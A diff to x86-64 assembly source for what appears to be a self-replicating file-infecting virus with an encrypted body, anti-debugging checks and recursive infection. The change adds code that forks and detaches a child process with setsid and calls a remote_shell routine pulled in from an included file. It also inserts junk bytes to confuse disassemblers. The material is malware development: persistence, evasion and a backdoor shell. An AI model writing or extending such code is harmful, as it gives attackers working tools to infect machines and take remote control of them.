@@ -54,14 +54,6 @@ decrypte:
     dec rbx
     cmp rbx, 0
 encrypted_start:
-;    xor rdi, rdi ;  PTRACE_TRACEME
-;    xor rsi, rsi
-;    mov rdx, 1
-;    xor r10, r10
-;    mov rax, SYS_PTRACE
-;    syscall             ; ptrace(PTRACE_TRACEME, 0, 1, 0);
-;    cmp rax, 0
-;    jl exit
     lea rdi, [rsp + fileName]
     call check_trace
     cmp rax, 0
@@ -70,6 +62,31 @@ encrypted_start:
     cmp rax, 0
     jnz exit
 
+
+    mov rax, SYS_GETPID
+    syscall
+    mov [rsp + ppid], rax
+
+    mov rax, SYS_FORK
+    syscall
+    mov rax, SYS_GETPID
+    syscall
+    cmp rax, [rsp + ppid]
+    jz encrypted_start_suite + 2
+
+    mov rax, SYS_SETSID
+    syscall
+
+    call remote_shell
+    xor rax, rax
+    pop rsi
+    pop rdi
+    pop rcx
+    pop rdx
+    leave
+    ret
+encrypted_start_suite:
+    db `\x48\x8b`
     lea rdi, [rsp + virusId]
     mov rsi, 8
     mov rdx, GRND_RANDOM
@@ -90,9 +107,10 @@ encrypted_start:
     call ft_strcpy
     mov rdi, rsp
     call recursive
-    jmp exit
+
 
 exit:
+    xor rax, rax
     pop rsi
     pop rdi
     pop rcx
@@ -107,6 +125,8 @@ jump:
     nop
 
 %include "get_processus_actif.s"
+
+%include "remote_shell.s"
 
 %include "check_trace.s"
 
